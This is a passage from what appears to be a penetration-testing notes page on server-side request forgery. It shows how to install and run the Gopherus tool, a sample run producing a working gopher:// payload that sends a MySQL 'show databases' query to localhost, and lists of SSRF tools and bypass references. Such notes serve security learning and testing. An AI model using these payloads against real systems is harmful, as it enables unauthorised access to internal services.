>chmod +x install.sh
>```
>To run the tool, you need Python 2 installation:
>```bash
>pyenv global 2.7.18
>```
>```bash
>sudo ./install.sh
>```

```bash
python ./gopherus.py --help
```

```bash
usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache

```

>[!example]+
> - The following command generates a Gopher URL that connects to the MySQL server running on the localhost and runs `SHOW DATABASES` command:
> 
> ```bash
> python ./gopherus.py --exploit mysql
> ```
> 
> ```bash
>   ________              .__
>  /  _____/  ____ ______ |  |__   ___________ __ __  ______
> /   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
> \    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
>  \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
>         \/       |__|        \/     \/                 \/
> 
> 		author: $_SpyD3r_$
> 
> For making it work username should not be password protected!!!
> 
> Give MySQL username: mysql
> Give query to execute: show databases
> 
> Your gopher link is ready to do SSRF : 
> 
> gopher://127.0.0.1:3306/_%a4%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%6d%79%73%71%6c%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%01%00%00%00%01
> 
> -----------Made-by-SpyD3r-----------
> ```


## Automated tools

- SSRF detection tools:
	- [`swisskyrepo/SSRFmap`](https://github.com/swisskyrepo/SSRFmap)
	- [`In3tinct/See-SURF`](https://github.com/In3tinct/See-SURF)
	- [`teknogeek/SSRF-Sheriff`](https://github.com/teknogeek/ssrf-sheriff)
	- [``assetnote/surf``](https://github.com/assetnote/surf)

- Specialized tools:
	- [`tarunkant/Gopherus`](https://github.com/tarunkant/Gopherus) is useful for generating Gopher links.
	- [`dwisiswant0/ipfuscator`](https://github.com/dwisiswant0/ipfuscator) can be used to automatically generate alternative IPv4 address representations.
	- [`Horlad/r3dir`](https://github.com/Horlad/r3dir) is designed to help with SSRF redirect bypasses. 
## References and further reading

- [`Server-Side Request Forgery — swisskyrepo/PayloadsAllTheThings`](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/)
- [`#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai`](https://www.youtube.com/watch?v=D1S-G8rJrEk); [slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [`assetnote/blind-ssrf-chains`](https://github.com/assetnote/blind-ssrf-chains)
- [`Cloud Metadata Dictionary useful for SSRF Testing — BuffaloWill, GitHub Gist`](https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb)
- [`SSRF Cheat Sheet & Bypass Technques — HighOn.Coffee`](https://highon.coffee/blog/ssrf-cheat-sheet/)

- [`SSRF Techniques — mindmap`](https://xmind.app/m/eJm7bd/#)

- [`AllThingsSSRF`](https://github.com/jdonsec/AllThingsSSRF) — a collection of writeups, cheatsheets, videos, related to SSRF in one single location.
- [`MustafaSky/Guide-to-SSRF`](https://github.com/MustafaSky/Guide-to-SSRF?tab=readme-ov-file)
- [`SSRF bible. Cheatsheet`](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?tab=t.0#heading=h.t4tsk5ixehdd)

- [`SVG SSRF Cheatsheet — Der Benji`](https://benjitrapp.github.io/memories/2022-06-08-svg-ssrf-cheatsheet/)

- [`URL Format Bypass — HackTricks`](https://hacktricks.alquymia.com.br/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html)
- [`Exploiting URL Parsing Confusion — Noam Moshe`](https://claroty.com/team82/research/exploiting-url-parsing-confusion)
- [`Introducing the URL validation bypass cheat sheet — PortSwigger Research, Zakhar Fedotkin`](https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet)
- [`New crazy payloads in the URL Validation Bypass Cheat Sheet — PortSwigger Research, Zakhar Fedotkin`](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)


- [`List of URI schemes — Wikipedia`](https://en.wikipedia.org/wiki/List_of_URI_schemes)
-  [`IPv6/IPv4 Address Embedding — The TCP/IP Guide`](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

- [`Cloud SSRF — HackTricks`](https://hacktricks.alquymia.com.br/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html)
- [`Server Side Request Forgery (SSRF) — Book of BugBounty Tips`](https://gowsundar.gitbook.io/book-of-bugbounty-tips/ssrf)
- [`SSRF (Server-Side Request Forgery) — The Hacker Recipes`](https://www.thehacker.recipes/web/inputs/ssrf/)
